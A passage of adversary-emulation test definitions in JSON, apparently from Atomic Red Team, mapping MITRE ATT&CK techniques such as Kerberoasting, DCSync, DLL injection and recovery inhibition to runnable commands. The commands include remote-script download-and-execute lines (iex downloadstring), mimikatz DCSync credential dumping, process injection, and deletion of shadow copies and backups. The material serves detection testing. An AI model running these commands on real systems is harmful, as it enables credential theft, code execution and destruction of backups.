Out-Null\nInvoke-Webrequest -Uri #{rubeus_url} -OutFile \"#{local_folder}\\#{local_executable}\"\n"}], "executor": {"command": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n", "cleanup_command": "Remove-Item \"#{local_folder}\\#{out_file}\" -ErrorAction Ignore\n", "name": "powershell", "elevation_required": false}}, {"name": "Extract all accounts in use as SPN using setspn", "auto_generated_guid": "e6f4affd-d826-4871-9a62-6c9004b8fe06", "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n", "supported_platforms": ["windows"], "input_arguments": {"domain_name": {"description": "The Domain Name to lookup against", "type": "string", "default": "%USERDNSDOMAIN%"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"command": "setspn -T #{domain_name} -Q */*\n", "name": "command_prompt"}}, {"name": "Request A Single Ticket via PowerShell", "auto_generated_guid": "988539bc-2ed7-4e62-aec6-7c5cf6680863", "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"command": "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n", "name": "powershell"}}, {"name": "Request All Tickets via PowerShell", "auto_generated_guid": "902f4ed2-1aba-4133-90f2-cff6d299d6da", "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n", "supported_platforms": ["windows"], "input_arguments": {"domain_name": {"description": "The Domain Name to lookup against", "type": "string", "default": "%USERDNSDOMAIN%"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Computer must be domain joined\n", "prereq_command": "if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Joining this computer to a domain must be done manually\n"}], "executor": {"command": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n", "name": "powershell"}}, {"name": "WinPwn - Kerberoasting", "auto_generated_guid": "78d10e20-c874-45f2-a9df-6fea0120ec27", "description": "Kerberoasting technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive", "name": "powershell"}}, {"name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus", "auto_generated_guid": "29094950-2c96-4cbd-b5e4-f7c65079678f", "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"", "name": "powershell"}}]}, "T1003.006": {"name": "DCSync", "technique_id": "attack-pattern--f303a39a-6255-4b89-aecc-18c4d8ca7163", "external_id": "T1003.006", "data_components": ["Network Traffic Flow", "Network Traffic Content", "Active Directory Object Access"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462"], "description": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)", "atomic_tests": [{"name": "DCSync (Active Directory)", "auto_generated_guid": "129efd28-8497-4c87-a1b0-73b9a870ca3e", "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n", "supported_platforms": ["windows"], "input_arguments": {"domain": {"description": "Targeted Active Directory domain", "type": "string", "default": "%userdnsdomain%"}, "user": {"description": "Targeted user", "type": "string", "default": "krbtgt"}, "mimikatz_path": {"description": "Mimikatz windows executable", "type": "path", "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n", "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n"}}, {"name": "Run DSInternals Get-ADReplAccount", "auto_generated_guid": "a0bced08-3fc5-4d8b-93b7-e8344739376e", "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n", "supported_platforms": ["windows"], "input_arguments": {"logonserver": {"description": "ComputerName argument default %logonserver%", "type": "string", "default": "$ENV:logonserver.TrimStart(\"\\\")"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "DSInternals must be installed\n", "prereq_command": "$RequiredModule = Get-Module -Name DSInternals -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['DSInternals']) {exit 1} else {exit 0}\n", "get_prereq_command": "Install-Module -Name DSInternals -Scope CurrentUser -Force\n"}], "executor": {"command": "Get-ADReplAccount -All -Server #{logonserver}\n", "name": "powershell", "elevation_required": false}}]}, "T1124": {"name": "System Time Discovery", "technique_id": "attack-pattern--f3c544dc-673c-4ef3-accb-53229f1ae077", "external_id": "T1124", "data_components": ["Process Creation", "Command Execution", "OS API Execution"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time)(Citation: Technet Windows Time Service)\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing <code>net time \\\\hostname</code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet Windows Time Service)\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.(Citation: show_clock_detail_cisco_cmd)\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)", "atomic_tests": [{"name": "System Time Discovery", "auto_generated_guid": "20aba24b-e61f-4b26-b4ce-4784f763ca20", "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n", "supported_platforms": ["windows"], "input_arguments": {"computer_name": {"description": "computer name to query", "type": "string", "default": "localhost"}}, "executor": {"command": "net time \\\\#{computer_name}\nw32tm /tz\n", "name": "command_prompt"}}, {"name": "System Time Discovery - PowerShell", "auto_generated_guid": "1d5711d6-655c-4a47-ae9c-6503c74fa877", "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-Date\n", "name": "powershell"}}, {"name": "System Time Discovery in FreeBSD/macOS", "auto_generated_guid": "f449c933-0891-407f-821e-7916a21a1a6f", "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n", "supported_platforms": ["linux", "macos"], "executor": {"command": "date\n", "name": "sh"}}, {"name": "System Time Discovery W32tm as a Delay", "auto_generated_guid": "d5d5a6b0-0f92-42d8-985d-47aafa2dd4db", "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n", "supported_platforms": ["windows"], "executor": {"command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2\n", "name": "command_prompt"}}, {"name": "System Time with Windows time Command", "auto_generated_guid": "53ead5db-7098-4111-bb3f-563be390e72e", "description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n", "supported_platforms": ["windows"], "executor": {"command": "time\n", "name": "command_prompt"}}]}, "T1053.002": {"name": "At", "technique_id": "attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0", "external_id": "T1053.002", "data_components": ["Scheduled Job Creation", "Process Creation", "File Modification", "Command Execution"], "kill_chain_phases": ["execution", "persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)", "atomic_tests": [{"name": "At.exe Scheduled task", "auto_generated_guid": "4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8", "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "at 13:20 /interactive cmd\n"}}, {"name": "At - Schedule a job", "auto_generated_guid": "7266d898-ac82-4ec0-97c7-436075d0d08e", "description": "This test submits a command to be run in the future by the `at` daemon.\n", "supported_platforms": ["linux"], "input_arguments": {"time_spec": {"description": "Time specification of when the command should run", "type": "string", "default": "now + 1 minute"}, "at_command": {"description": "The command to be run", "type": "string", "default": "echo Hello from Atomic Red Team"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The `at` and `atd` executables must exist in the PATH\n", "prereq_command": "which at && which atd\n", "get_prereq_command": "echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'\n"}, {"description": "The `atd` daemon must be running\n", "prereq_command": "systemctl status atd || service atd status\n", "get_prereq_command": "echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "echo \"#{at_command}\" | at #{time_spec}"}}, {"name": "At - Schedule a job freebsd", "auto_generated_guid": "549863fb-1c91-467e-97fc-1fa32b9f356b", "description": "This test submits a command to be run in the future by the `at` daemon.\n", "supported_platforms": ["linux"], "input_arguments": {"time_spec": {"description": "Time specification of when the command should run", "type": "string", "default": "now + 1 minute"}, "at_command": {"description": "The command to be run", "type": "string", "default": "echo Hello from Atomic Red Team"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The `at` executable must exist in the PATH\n", "prereq_command": "which at\n", "get_prereq_command": "echo 'Please install `at` ; they were not found in the PATH (Package name: `at`)'\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "echo \"#{at_command}\" | at #{time_spec}"}}]}, "T1055.001": {"name": "Dynamic-link Library Injection", "technique_id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945", "external_id": "T1055.001", "data_components": ["Process Modification", "Process Access", "OS API Execution", "Process Metadata", "Module Load"], "kill_chain_phases": ["defense-evasion", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--90f39ee1-d5a3-4aaa-9f28-3b42815b0d46"], "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ", "atomic_tests": [{"name": "Process Injection via mavinject.exe", "auto_generated_guid": "74496461-11a1-4982-b439-4d87a550d254", "description": "Windows 10 Utility To Inject DLLS.\n\nUpon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.\nWith default arguments, expect to see a MessageBox, with notepad's icon in taskbar.\n", "supported_platforms": ["windows"], "input_arguments": {"process_id": {"description": "PID of input_arguments", "type": "string", "default": "(Start-Process notepad -PassThru).id"}, "dll_payload": {"description": "DLL to Inject", "type": "path", "default": "PathToAtomicsFolder\\T1055.001\\src\\x64\\T1055.001.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Utility to inject must exist on disk at specified location (#{dll_payload})\n", "prereq_command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll\" -OutFile \"#{dll_payload}\"\n"}], "executor": {"command": "$mypid = #{process_id}\nmavinject $mypid /INJECTRUNNING \"#{dll_payload}\"\nStop-Process -processname notepad\n", "name": "powershell", "elevation_required": true}}, {"name": "WinPwn - Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique", "auto_generated_guid": "8b56f787-73d9-4f1d-87e8-d07e89cbc7f5", "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')", "name": "powershell"}}]}, "T1056.004": {"name": "Credential API Hooking", "technique_id": "attack-pattern--f5946b5e-9408-485f-a7f7-b5efc88909b6", "external_id": "T1056.004", "data_components": ["OS API Execution", "Process Metadata"], "kill_chain_phases": ["collection", "credential-access"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation: Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation: HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic Hooking 2015)\n", "atomic_tests": [{"name": "Hook PowerShell TLS Encrypt/Decrypt Messages", "auto_generated_guid": "de1934ea-1fbf-425b-8795-65fb27dd7e33", "description": "Hooks functions in PowerShell to read TLS Communications\n", "supported_platforms": ["windows"], "input_arguments": {"file_name": {"description": "Dll To Inject", "type": "path", "default": "PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll"}, "server_name": {"description": "TLS Server To Test Get Request", "type": "url", "default": "https://www.example.com"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "T1056.004x64.dll must exist on disk at specified location (#{file_name})\n", "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll\" -OutFile \"#{file_name}\" -UseBasicParsing\n"}], "executor": {"command": "mavinject $pid /INJECTRUNNING \"#{file_name}\"\nInvoke-WebRequest #{server_name} -UseBasicParsing\n", "name": "powershell", "elevation_required": true}}]}, "T1490": {"name": "Inhibit System Recovery", "technique_id": "attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a", "external_id": "T1490", "data_components": ["Process Creation", "Command Execution", "Snapshot Deletion", "Windows Registry Key Modification", "Cloud Storage Deletion", "Service Metadata", "File Deletion"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": ["course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3", "course-of-action--3efe43d1-6f3f-4fcb-ab39-4a730971f70b", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"], "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)", "atomic_tests": [{"name": "Windows - Delete Volume Shadow Copies", "auto_generated_guid": "43819286-91a9-4369-90ed-d31fb4da2c01", "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n", "supported_platforms": ["windows"], "dependency_executor_name": "powershell", "dependencies": [{"description": "Create volume shadow copy of C:\\ . This prereq command only works on Windows Server or Windows 8.\n", "prereq_command": "if(!(vssadmin.exe list shadows | findstr \"No items found that satisfy the query.\")) { exit 0 } else { exit 1 }\n", "get_prereq_command": "vssadmin.exe create shadow /for=c:\n"}], "executor": {"command": "vssadmin.exe delete shadows /all /quiet\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - Delete Volume Shadow Copies via WMI", "auto_generated_guid": "6a3ff8dd-f49c-4272-a658-11c2fe58bd88", "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n", "supported_platforms": ["windows"], "executor": {"command": "wmic.exe shadowcopy delete\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - wbadmin Delete Windows Backup Catalog", "auto_generated_guid": "263ba6cb-ea2b-41c9-9d4e-b652dadd002c", "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n", "supported_platforms": ["windows"], "executor": {"command": "wbadmin delete catalog -quiet\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - Disable Windows Recovery Console Repair", "auto_generated_guid": "cf21060a-80b3-4238-a595-22525de4ab81", "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n", "supported_platforms": ["windows"], "executor": {"command": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "cleanup_command": "bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures >nul 2>&1\nbcdedit.exe /set {default} recoveryenabled yes >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell", "auto_generated_guid": "39a295ca-7059-4a88-86f6-09556c1211e7", "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n", "name": "powershell", "elevation_required": true}}, {"name": "Windows - Delete Backup Files", "auto_generated_guid": "6b1dbaf6-cc8a-4ea6-891f-6058569653bf", "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n", "supported_platforms": ["windows"], "executor": {"command": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - wbadmin Delete systemstatebackup", "auto_generated_guid": "584331dd-75bc-4c02-9e0b-17f5fd81c748", "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n", "supported_platforms": ["windows"], "executor": {"command": "wbadmin delete systemstatebackup -keepVersions:0\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Windows - Disable the SR scheduled task", "auto_generated_guid": "1c68c68d-83a4-4981-974e-8993055fa034", "description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n", "supported_platforms": ["windows"], "executor": {"command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable\n", "cleanup_command": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /enable >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Disable System Restore Through Registry", "auto_generated_guid": "66e647d1-8741-4e43-b7c1-334760c2047f", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n", "supported_platforms": ["windows"], "executor": {"command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add 